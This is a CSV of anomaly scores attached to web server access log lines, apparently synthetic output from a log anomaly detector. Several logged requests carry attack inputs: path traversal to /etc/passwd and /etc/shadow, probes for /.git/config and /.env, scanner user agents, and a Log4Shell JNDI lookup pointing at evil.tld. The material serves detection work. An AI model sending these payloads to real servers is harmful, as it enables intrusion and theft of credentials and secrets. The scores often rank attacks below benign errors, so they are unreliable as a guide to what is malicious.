score_content,score_session,score_fused,score_fused_norm,line
46.50569534301758,,46.50569534301758,46.50569534301758,66.96.158.253 - - [10/Jan/2025:12:40:06 +0000] "HEAD /profile HTTP/1.1" 200 9524 "https://news.ycombinator.com/" "nikto/2.5.0"
10.996164321899414,,10.996164321899414,10.996164321899414,72.139.249.75 - - [10/Jan/2025:12:40:07 +0000] "PUT /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 12880 "https://example.com/" "nikto/2.5.0"
68.53166198730469,,68.53166198730469,68.53166198730469,115.226.120.251 - - [10/Jan/2025:12:40:09 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1881 "https://news.ycombinator.com/" "dirb/2.22"
24.048839569091797,,24.048839569091797,24.048839569091797,85.218.1.39 - - [10/Jan/2025:12:40:10 +0000] "GET /search?q=phone HTTP/1.1" 200 9052 "https://www.google.com/" "nikto/2.5.0"
30124.162109375,,30124.162109375,30124.162109375,2.208.169.92 - - [10/Jan/2025:12:40:12 +0000] "GET /assets/app.css HTTP/1.1" 403 567 "https://twitter.com/" "dirb/2.22"
74.41319274902344,,74.41319274902344,74.41319274902344,116.172.70.97 - - [10/Jan/2025:12:40:13 +0000] "OPTIONS /api/products HTTP/1.1" 301 12974 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30171.591796875,,30171.591796875,30171.591796875,20.175.82.188 - - [10/Jan/2025:12:40:16 +0000] "DELETE /search?q=router HTTP/1.1" 400 835 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
93.94827270507812,,93.94827270507812,93.94827270507812,8.218.26.46 - - [10/Jan/2025:12:40:17 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 6495 "-" "nikto/2.5.0"
46.56972885131836,,46.56972885131836,46.56972885131836,96.137.167.162 - - [10/Jan/2025:12:40:20 +0000] "HEAD /logout HTTP/1.1" 200 18006 "https://news.ycombinator.com/" "dirb/2.22"
0.2386830896139145,,0.2386830896139145,0.2386830896139145,50.210.171.232 - - [10/Jan/2025:12:40:21 +0000] "GET /assets/app.css HTTP/1.1" 201 4189 "https://www.google.com/" "curl/7.85.0"
7.04951810836792,,7.04951810836792,7.04951810836792,132.121.158.201 - - [10/Jan/2025:12:40:22 +0000] "POST /phpmyadmin HTTP/1.1" 301 10435 "https://www.google.com/" "nikto/2.5.0"
0.3496913015842438,,0.3496913015842438,0.3496913015842438,54.172.37.163 - - [10/Jan/2025:12:40:24 +0000] "GET /.git/config HTTP/1.1" 200 11356 "https://twitter.com/" "nikto/2.5.0"
46.56391525268555,,46.56391525268555,46.56391525268555,132.192.125.121 - - [10/Jan/2025:12:40:27 +0000] "HEAD /about HTTP/1.1" 200 5428 "-" "curl/7.85.0"
5.552929878234863,,5.552929878234863,5.552929878234863,114.54.11.246 - - [10/Jan/2025:12:40:30 +0000] "POST /wp-login.php HTTP/1.1" 302 18168 "-" "nikto/2.5.0"
93.92919921875,,93.92919921875,93.92919921875,49.161.107.252 - - [10/Jan/2025:12:40:31 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 6240 "-" "Wget/1.21.2 (linux-gnu)"
26.835508346557617,,26.835508346557617,26.835508346557617,193.54.234.227 - - [10/Jan/2025:12:40:31 +0000] "DELETE /contact HTTP/1.1" 200 17146 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
24.021106719970703,,24.021106719970703,24.021106719970703,85.131.81.118 - - [10/Jan/2025:12:40:34 +0000] "GET /search?q=router HTTP/1.1" 200 7916 "https://twitter.com/" "nikto/2.5.0"
2.2565231323242188,,2.2565231323242188,2.2565231323242188,179.170.134.10 - - [10/Jan/2025:12:40:36 +0000] "GET / HTTP/1.1" 200 8840 "https://www.google.com/" "curl/7.85.0"
49.24738693237305,,49.24738693237305,49.24738693237305,10.126.172.171 - - [10/Jan/2025:12:40:39 +0000] "HEAD /login HTTP/1.1" 304 16730 "https://twitter.com/" "python-requests/2.31.0"
26.649974822998047,,26.649974822998047,26.649974822998047,43.70.216.57 - - [10/Jan/2025:12:40:42 +0000] "GET /search?q=laptop HTTP/1.1" 301 18349 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.266589879989624,,2.266589879989624,2.266589879989624,96.117.112.145 - - [10/Jan/2025:12:40:45 +0000] "GET / HTTP/1.1" 200 11495 "https://twitter.com/" "curl/7.85.0"
70.25206756591797,,70.25206756591797,70.25206756591797,157.193.223.42 - - [10/Jan/2025:12:40:48 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 3549 "https://www.google.com/" "curl/7.85.0"
30124.298828125,,30124.298828125,30124.298828125,5.148.59.211 - - [10/Jan/2025:12:40:49 +0000] "GET /index.html HTTP/1.1" 404 1013 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
103.03363800048828,,103.03363800048828,103.03363800048828,66.20.223.55 - - [10/Jan/2025:12:40:51 +0000] "TRACE /profile HTTP/1.1" 200 19212 "-" "nikto/2.5.0"
30225.505859375,,30225.505859375,30225.505859375,13.23.13.210 - - [10/Jan/2025:12:40:52 +0000] "TRACE /contact HTTP/1.1" 400 1423 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
15.368910789489746,,15.368910789489746,15.368910789489746,9.88.6.175 - - [10/Jan/2025:12:40:54 +0000] "PUT /api/products HTTP/1.1" 302 11771 "https://example.com/" "nikto/2.5.0"
74.59125518798828,,74.59125518798828,74.59125518798828,216.176.97.202 - - [10/Jan/2025:12:40:56 +0000] "OPTIONS /login HTTP/1.1" 302 13301 "https://news.ycombinator.com/" "dirb/2.22"
34.86867141723633,,34.86867141723633,34.86867141723633,190.141.102.110 - - [10/Jan/2025:12:40:59 +0000] "PUT /search?q=camera HTTP/1.1" 200 3486 "https://example.com/" "dirb/2.22"
70.30821228027344,,70.30821228027344,70.30821228027344,180.88.153.22 - - [10/Jan/2025:12:41:00 +0000] "OPTIONS /.git/config HTTP/1.1" 200 10868 "https://example.com/" "curl/7.85.0"
4.693114757537842,,4.693114757537842,4.693114757537842,3.79.118.189 - - [10/Jan/2025:12:41:02 +0000] "GET /admin HTTP/1.1" 304 5277 "https://www.google.com/" "dirb/2.22"
24.05780792236328,,24.05780792236328,24.05780792236328,27.72.26.194 - - [10/Jan/2025:12:41:02 +0000] "GET /search?q=phone HTTP/1.1" 200 11453 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.21499909460544586,,0.21499909460544586,0.21499909460544586,194.213.55.215 - - [10/Jan/2025:12:41:04 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8685 "https://twitter.com/" "nikto/2.5.0"
93.90380096435547,,93.90380096435547,93.90380096435547,183.240.48.102 - - [10/Jan/2025:12:41:06 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5237 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.846612930297852,,4.846612930297852,4.846612930297852,163.239.73.50 - - [10/Jan/2025:12:41:08 +0000] "GET / HTTP/1.1" 301 4684 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30169.537109375,,30169.537109375,30169.537109375,70.46.186.162 - - [10/Jan/2025:12:41:08 +0000] "HEAD /dashboard HTTP/1.1" 403 182 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.897818565368652,,12.897818565368652,12.897818565368652,236.113.188.66 - - [10/Jan/2025:12:41:08 +0000] "PUT /login HTTP/1.1" 200 9239 "https://example.com/" "python-requests/2.31.0"
48.919166564941406,,48.919166564941406,48.919166564941406,124.9.251.56 - - [10/Jan/2025:12:41:10 +0000] "DELETE /search?q=phone HTTP/1.1" 200 17416 "https://twitter.com/" "dirb/2.22"
0.5582906603813171,,0.5582906603813171,0.5582906603813171,116.155.82.84 - - [10/Jan/2025:12:41:10 +0000] "GET /.env HTTP/1.1" 200 1808 "https://news.ycombinator.com/" "curl/7.85.0"
30136.287109375,,30136.287109375,30136.287109375,5.199.157.186 - - [10/Jan/2025:12:41:13 +0000] "PUT /logout HTTP/1.1" 401 121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.527525901794434,,4.527525901794434,4.527525901794434,247.231.231.231 - - [10/Jan/2025:12:41:16 +0000] "POST /contact HTTP/1.1" 200 4817 "https://news.ycombinator.com/" "nikto/2.5.0"
30149.912109375,,30149.912109375,30149.912109375,199.113.143.28 - - [10/Jan/2025:12:41:19 +0000] "POST /search?q=camera HTTP/1.1" 404 671 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
26.81861114501953,,26.81861114501953,26.81861114501953,105.27.64.41 - - [10/Jan/2025:12:41:21 +0000] "DELETE /logout HTTP/1.1" 200 1997 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
71.92556762695312,,71.92556762695312,71.92556762695312,243.240.35.2 - - [10/Jan/2025:12:41:23 +0000] "OPTIONS /profile HTTP/1.1" 200 16887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.000303030014038,,3.000303030014038,3.000303030014038,149.138.15.105 - - [10/Jan/2025:12:41:23 +0000] "GET /index.html HTTP/1.1" 301 13077 "https://twitter.com/" "dirb/2.22"
71.93099975585938,,71.93099975585938,71.93099975585938,52.133.216.14 - - [10/Jan/2025:12:41:25 +0000] "OPTIONS /contact HTTP/1.1" 200 18820 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
68.46066284179688,,68.46066284179688,68.46066284179688,98.78.116.199 - - [10/Jan/2025:12:41:27 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 6308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.471943378448486,,4.471943378448486,4.471943378448486,126.48.137.142 - - [10/Jan/2025:12:41:29 +0000] "POST /api/products HTTP/1.1" 200 10949 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.32161805033683777,,0.32161805033683777,0.32161805033683777,34.214.25.202 - - [10/Jan/2025:12:41:31 +0000] "GET /.git/config HTTP/1.1" 200 827 "https://twitter.com/" "dirb/2.22"
93.88249969482422,,93.88249969482422,93.88249969482422,214.95.26.13 - - [10/Jan/2025:12:41:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 14444 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
34.9039306640625,,34.9039306640625,34.9039306640625,214.43.247.64 - - [10/Jan/2025:12:41:35 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 8319 "-" "Wget/1.21.2 (linux-gnu)"
105.56143188476562,,105.56143188476562,105.56143188476562,46.184.36.130 - - [10/Jan/2025:12:41:36 +0000] "TRACE /profile HTTP/1.1" 301 3339 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30125.84375,,30125.84375,30125.84375,195.13.152.252 - - [10/Jan/2025:12:41:38 +0000] "GET /admin HTTP/1.1" 401 105 "https://example.com/" "curl/7.85.0"
26.607892990112305,,26.607892990112305,26.607892990112305,76.220.127.163 - - [10/Jan/2025:12:41:38 +0000] "POST /search?q=camera HTTP/1.1" 200 8188 "-" "sqlmap/1.7.2#stable"
4.890955448150635,,4.890955448150635,4.890955448150635,175.144.39.24 - - [10/Jan/2025:12:41:39 +0000] "GET / HTTP/1.1" 301 16875 "https://twitter.com/" "curl/7.85.0"
2.241119623184204,,2.241119623184204,2.241119623184204,8.128.34.219 - - [10/Jan/2025:12:41:41 +0000] "GET / HTTP/1.1" 200 5210 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
12.745644569396973,,12.745644569396973,12.745644569396973,83.58.66.62 - - [10/Jan/2025:12:41:42 +0000] "PUT /api/products HTTP/1.1" 200 10205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
94.0038833618164,,94.0038833618164,94.0038833618164,25.8.118.218 - - [10/Jan/2025:12:41:42 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 201 2551 "https://twitter.com/" "python-requests/2.31.0"
30136.34375,,30136.34375,30136.34375,11.244.226.166 - - [10/Jan/2025:12:41:42 +0000] "PUT /login HTTP/1.1" 404 1104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
34.873600006103516,,34.873600006103516,34.873600006103516,178.61.252.41 - - [10/Jan/2025:12:41:45 +0000] "PUT /search?q=monitor HTTP/1.1" 200 10067 "https://twitter.com/" "nikto/2.5.0"
70.20199584960938,,70.20199584960938,70.20199584960938,179.76.69.187 - - [10/Jan/2025:12:41:48 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 200 16145 "https://www.google.com/" "python-requests/2.31.0"
26.647554397583008,,26.647554397583008,26.647554397583008,77.38.191.155 - - [10/Jan/2025:12:41:50 +0000] "POST /search?q=phone HTTP/1.1" 200 12621 "https://news.ycombinator.com/" "dirb/2.22"
34.86544418334961,,34.86544418334961,34.86544418334961,200.67.126.125 - - [10/Jan/2025:12:41:53 +0000] "PUT /search?q=monitor HTTP/1.1" 200 7958 "-" "python-requests/2.31.0"
74.46694946289062,,74.46694946289062,74.46694946289062,190.81.111.199 - - [10/Jan/2025:12:41:53 +0000] "OPTIONS /dashboard HTTP/1.1" 304 7364 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.79993438720703,,127.79993438720703,127.79993438720703,126.80.241.11 - - [10/Jan/2025:12:41:55 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 19557 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
1.797895073890686,,1.797895073890686,1.797895073890686,3.42.151.189 - - [10/Jan/2025:12:41:58 +0000] "GET /server-status HTTP/1.1" 200 13463 "https://www.google.com/" "nikto/2.5.0"
24.01042938232422,,24.01042938232422,24.01042938232422,181.25.47.7 - - [10/Jan/2025:12:41:58 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1918 "-" "dirb/2.22"
44.7517204284668,,44.7517204284668,44.7517204284668,35.193.224.160 - - [10/Jan/2025:12:41:59 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 1714 "https://www.google.com/" "sqlmap/1.7.2#stable"
71.99288177490234,,71.99288177490234,71.99288177490234,228.147.164.164 - - [10/Jan/2025:12:41:59 +0000] "OPTIONS /login HTTP/1.1" 200 14469 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.85627746582031,,71.85627746582031,71.85627746582031,30.218.44.213 - - [10/Jan/2025:12:42:02 +0000] "OPTIONS /dashboard HTTP/1.1" 200 16382 "https://example.com/" "nikto/2.5.0"
12.727805137634277,,12.727805137634277,12.727805137634277,214.140.40.179 - - [10/Jan/2025:12:42:05 +0000] "PUT /phpmyadmin HTTP/1.1" 200 10446 "https://twitter.com/" "nikto/2.5.0"
0.3836980164051056,,0.3836980164051056,0.3836980164051056,254.125.252.209 - - [10/Jan/2025:12:42:07 +0000] "GET /index.html HTTP/1.1" 200 12502 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.292283535003662,,2.292283535003662,2.292283535003662,211.19.63.95 - - [10/Jan/2025:12:42:10 +0000] "GET / HTTP/1.1" 200 19715 "https://example.com/" "dirb/2.22"
26.830951690673828,,26.830951690673828,26.830951690673828,241.246.27.212 - - [10/Jan/2025:12:42:10 +0000] "DELETE /contact HTTP/1.1" 200 15617 "-" "Wget/1.21.2 (linux-gnu)"
2.2664778232574463,,2.2664778232574463,2.2664778232574463,2.160.226.40 - - [10/Jan/2025:12:42:12 +0000] "GET / HTTP/1.1" 200 11464 "https://news.ycombinator.com/" "dirb/2.22"
49.026100158691406,,49.026100158691406,49.026100158691406,231.66.213.202 - - [10/Jan/2025:12:42:14 +0000] "HEAD /api/products HTTP/1.1" 302 8538 "-" "Wget/1.21.2 (linux-gnu)"
0.19399327039718628,,0.19399327039718628,0.19399327039718628,59.104.84.213 - - [10/Jan/2025:12:42:16 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 3782 "https://www.google.com/" "dirb/2.22"
25.009910583496094,,25.009910583496094,25.009910583496094,49.233.63.116 - - [10/Jan/2025:12:42:19 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17896 "https://www.google.com/" "nikto/2.5.0"
0.306989461183548,,0.306989461183548,0.306989461183548,144.174.133.112 - - [10/Jan/2025:12:42:22 +0000] "GET /assets/app.js HTTP/1.1" 200 14933 "-" "python-requests/2.31.0"
23.9811954498291,,23.9811954498291,23.9811954498291,79.128.12.136 - - [10/Jan/2025:12:42:25 +0000] "GET /search?q=monitor HTTP/1.1" 200 3549 "-" "nikto/2.5.0"
48.892555236816406,,48.892555236816406,48.892555236816406,81.178.188.224 - - [10/Jan/2025:12:42:28 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 16413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30127.955078125,,30127.955078125,30127.955078125,89.11.43.247 - - [10/Jan/2025:12:42:30 +0000] "POST /api/products HTTP/1.1" 400 552 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
25.009000778198242,,25.009000778198242,25.009000778198242,29.239.205.242 - - [10/Jan/2025:12:42:30 +0000] "DELETE /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17581 "https://www.google.com/" "curl/7.85.0"
103.0650405883789,,103.0650405883789,103.0650405883789,140.55.169.105 - - [10/Jan/2025:12:42:31 +0000] "TRACE /about HTTP/1.1" 200 708 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.022925853729248,,2.022925853729248,2.022925853729248,145.231.68.22 - - [10/Jan/2025:12:42:32 +0000] "GET /admin HTTP/1.1" 200 779 "https://www.google.com/" "python-requests/2.31.0"
0.2345636785030365,,0.2345636785030365,0.2345636785030365,42.195.11.194 - - [10/Jan/2025:12:42:35 +0000] "GET /assets/app.css HTTP/1.1" 200 2614 "https://twitter.com/" "sqlmap/1.7.2#stable"
12.804015159606934,,12.804015159606934,12.804015159606934,112.181.100.60 - - [10/Jan/2025:12:42:36 +0000] "PUT /profile HTTP/1.1" 200 4661 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.66693878173828,,127.66693878173828,127.66693878173828,68.173.215.151 - - [10/Jan/2025:12:42:38 +0000] "TRACE /search?q=phone HTTP/1.1" 301 12410 "https://news.ycombinator.com/" "python-requests/2.31.0"
26.60291290283203,,26.60291290283203,26.60291290283203,6.113.32.11 - - [10/Jan/2025:12:42:40 +0000] "POST /search?q=laptop HTTP/1.1" 200 6983 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.265072822570801,,2.265072822570801,2.265072822570801,85.174.231.199 - - [10/Jan/2025:12:42:40 +0000] "GET / HTTP/1.1" 200 11077 "https://www.google.com/" "curl/7.85.0"
24.066984176635742,,24.066984176635742,24.066984176635742,16.180.57.156 - - [10/Jan/2025:12:42:43 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 18030 "https://www.google.com/" "python-requests/2.31.0"
2.235677480697632,,2.235677480697632,2.235677480697632,224.128.153.3 - - [10/Jan/2025:12:42:44 +0000] "GET / HTTP/1.1" 200 951 "-" "curl/7.85.0"
68.5578384399414,,68.5578384399414,68.5578384399414,108.135.76.51 - - [10/Jan/2025:12:42:45 +0000] "HEAD /search?q=router HTTP/1.1" 200 12132 "https://twitter.com/" "dirb/2.22"
49.194679260253906,,49.194679260253906,49.194679260253906,103.175.220.181 - - [10/Jan/2025:12:42:45 +0000] "HEAD /login HTTP/1.1" 302 12585 "https://www.google.com/" "python-requests/2.31.0"
2.988571882247925,,2.988571882247925,2.988571882247925,249.48.109.77 - - [10/Jan/2025:12:42:47 +0000] "GET /index.html HTTP/1.1" 302 5013 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11071.2197265625,,11071.2197265625,11071.2197265625,202.234.67.100 - - [10/Jan/2025:12:42:48 +0000] "PUT /search?q=headphones HTTP/1.1" 502 306 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
30150.0859375,,30150.0859375,30150.0859375,242.30.146.231 - - [10/Jan/2025:12:42:50 +0000] "DELETE /dashboard HTTP/1.1" 403 87 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.2745370864868164,,2.2745370864868164,2.2745370864868164,103.74.123.253 - - [10/Jan/2025:12:42:52 +0000] "GET / HTTP/1.1" 200 13799 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0489397048950195,,2.0489397048950195,2.0489397048950195,232.79.29.194 - - [10/Jan/2025:12:42:52 +0000] "GET /login HTTP/1.1" 204 12899 "https://twitter.com/" "nikto/2.5.0"
70.27900695800781,,70.27900695800781,70.27900695800781,147.198.104.64 - - [10/Jan/2025:12:42:53 +0000] "OPTIONS /.git/config HTTP/1.1" 200 3230 "https://example.com/" "python-requests/2.31.0"
26.8006591796875,,26.8006591796875,26.8006591796875,74.69.106.89 - - [10/Jan/2025:12:42:56 +0000] "DELETE /contact HTTP/1.1" 204 8647 "https://www.google.com/" "sqlmap/1.7.2#stable"
101.42257690429688,,101.42257690429688,101.42257690429688,193.142.8.131 - - [10/Jan/2025:12:42:58 +0000] "TRACE /.git/config HTTP/1.1" 200 13429 "https://example.com/" "nikto/2.5.0"
30136.3046875,,30136.3046875,30136.3046875,194.111.26.143 - - [10/Jan/2025:12:43:01 +0000] "PUT /login HTTP/1.1" 403 1119 "-" "python-requests/2.31.0"
26.675682067871094,,26.675682067871094,26.675682067871094,159.83.223.8 - - [10/Jan/2025:12:43:03 +0000] "GET /api/product?id=123 HTTP/1.1" 304 1474 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
68.54663848876953,,68.54663848876953,68.54663848876953,153.84.163.205 - - [10/Jan/2025:12:43:03 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2200 "-" "curl/7.85.0"
0.39117544889450073,,0.39117544889450073,0.39117544889450073,139.238.144.94 - - [10/Jan/2025:12:43:05 +0000] "GET /index.html HTTP/1.1" 200 14746 "https://news.ycombinator.com/" "curl/7.85.0"
26.597759246826172,,26.597759246826172,26.597759246826172,185.243.223.239 - - [10/Jan/2025:12:43:05 +0000] "DELETE /server-status HTTP/1.1" 200 2280 "https://example.com/" "nikto/2.5.0"
30136.220703125,,30136.220703125,30136.220703125,245.129.43.208 - - [10/Jan/2025:12:43:08 +0000] "PUT /admin HTTP/1.1" 401 1440 "-" "dirb/2.22"
0.27195295691490173,,0.27195295691490173,0.27195295691490173,136.72.140.106 - - [10/Jan/2025:12:43:08 +0000] "GET /assets/app.css HTTP/1.1" 200 11914 "https://news.ycombinator.com/" "curl/7.85.0"
2.2629454135894775,,2.2629454135894775,2.2629454135894775,150.221.132.180 - - [10/Jan/2025:12:43:10 +0000] "GET / HTTP/1.1" 200 10502 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30216.369140625,,30216.369140625,30216.369140625,85.97.192.100 - - [10/Jan/2025:12:43:12 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 400 314 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.616579055786133,,26.616579055786133,26.616579055786133,131.9.246.182 - - [10/Jan/2025:12:43:13 +0000] "POST /search?q=camera HTTP/1.1" 200 10426 "https://twitter.com/" "sqlmap/1.7.2#stable"
71.98766326904297,,71.98766326904297,71.98766326904297,241.51.187.84 - - [10/Jan/2025:12:43:14 +0000] "OPTIONS /about HTTP/1.1" 200 12844 "https://example.com/" "dirb/2.22"
4.576756000518799,,4.576756000518799,4.576756000518799,70.31.40.117 - - [10/Jan/2025:12:43:15 +0000] "POST /contact HTTP/1.1" 200 18602 "https://example.com/" "sqlmap/1.7.2#stable"
0.32131651043891907,,0.32131651043891907,0.32131651043891907,65.3.122.58 - - [10/Jan/2025:12:43:16 +0000] "GET /assets/app.js HTTP/1.1" 200 19801 "-" "curl/7.85.0"
125.10015106201172,,125.10015106201172,125.10015106201172,172.15.101.170 - - [10/Jan/2025:12:43:19 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1020 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.643441677093506,,4.643441677093506,4.643441677093506,39.219.232.235 - - [10/Jan/2025:12:43:22 +0000] "POST /login HTTP/1.1" 200 15771 "https://www.google.com/" "nikto/2.5.0"
26.878664016723633,,26.878664016723633,26.878664016723633,158.115.79.4 - - [10/Jan/2025:12:43:22 +0000] "DELETE /logout HTTP/1.1" 200 19474 "-" "python-requests/2.31.0"
48.829593658447266,,48.829593658447266,48.829593658447266,237.37.169.137 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 5161 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
48.88992691040039,,48.88992691040039,48.88992691040039,225.195.140.191 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=router HTTP/1.1" 200 15541 "https://twitter.com/" "dirb/2.22"
2.0646750926971436,,2.0646750926971436,2.0646750926971436,44.65.194.92 - - [10/Jan/2025:12:43:25 +0000] "GET /login HTTP/1.1" 200 15904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.28412896394729614,,0.28412896394729614,0.28412896394729614,199.43.84.35 - - [10/Jan/2025:12:43:26 +0000] "GET /assets/app.css HTTP/1.1" 200 15581 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
29.176546096801758,,29.176546096801758,29.176546096801758,25.225.152.95 - - [10/Jan/2025:12:43:26 +0000] "POST /search?q=camera HTTP/1.1" 301 5257 "https://news.ycombinator.com/" "curl/7.85.0"
